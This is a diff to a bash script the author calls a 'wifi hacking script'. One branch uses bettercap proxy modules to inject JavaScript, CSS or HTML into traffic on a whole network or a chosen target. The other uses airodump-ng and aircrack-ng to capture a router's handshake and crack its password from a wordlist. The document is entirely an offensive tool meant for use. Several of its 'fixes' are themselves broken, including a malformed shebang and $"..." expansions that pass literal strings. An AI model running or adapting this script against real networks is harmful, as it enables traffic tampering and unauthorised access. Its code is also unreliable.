@@ -1,3 +1,4 @@
+#!bin/bash
 echo "this is my wifi hacking script..."
 sleep 3s
 clear
@@ -7,46 +8,59 @@ do
 case $wifi in
 bettercap)
 echo "would you like to import bettercap modules from github? Y/n"
-read choice1
+read -r choice1
+export choice1
 if [ $"choice1" = "Y" ]
 then
-cd /opt/
+cd /opt/ || return
 git clone https://github.com/evilsocket/bettercap-proxy-modules
 else
 echo "your loss..."
+fi
 sleep 3s
 clear
-echo "would you like to add a target? ad -T to add a target or leave blank for the whole network
-read target
-echo "what proxy module would you like to use? injectjs, injectcss, or injecthtml?
-read inject
-if [ $"injectjs = "injectjs ]
+echo "would you like to add a target? ad -T to add a target or leave blank for the whole network"
+read -r target
+export target
+echo "what proxy module would you like to use? injectjs, injectcss, or injecthtml?"
+read -r inject
+export inject
+if [ $"injectjs" = "injectjs" ]
 then
 echo "input the js file link here"
-read injectjsurl
+read -r injectjsurl
+export injectjsurl
 elif [ $"inject" = "injectcss" ]
 then
 echo "path to the css file to inject"
-read csspath
+read -r csspath
+export csspath
 elif [ $"inject" = "injecthtml" ]
 then 
 echo "html code to input here"
-read htmlinject
+read -r htmlinject
+export htmlinject
 echo "press crtl+c to close the spoofing/hack"
-bettercap $target --proxy-module $inject ;;
+fi
+bettercap $"target" --proxy-module $"inject" ;;
 apcracker)
 xterm -hold -e airodump-ng wlan0mon
 echo "input channel here"
-read channel
+read -r channel
+export channel
 echo "input bssid"
-read bssid
+read -r bssid
+export bssid
 echo "writefile name"
-read writefile
-xterm -e -hold airodump-ng -c $channel -b $bssid wlan0mon -w $writefile
+read -r writefile
+export writefile
+xterm -e -hold airodump-ng -c $"channel" -b $"bssid" wlan0mon -w $"writefile"
 echo "path to password list"
-read password
+read -r password
+export password
 echo "router mac"
-read mac
-xterm -e -hold aircrack-ng -w $password -b $mac *.cap ;;
+read -r mac
+export mac
+xterm -e -hold aircrack-ng -w $"password" -b $"mac" ./*.pcap* ;;
 esac
 done
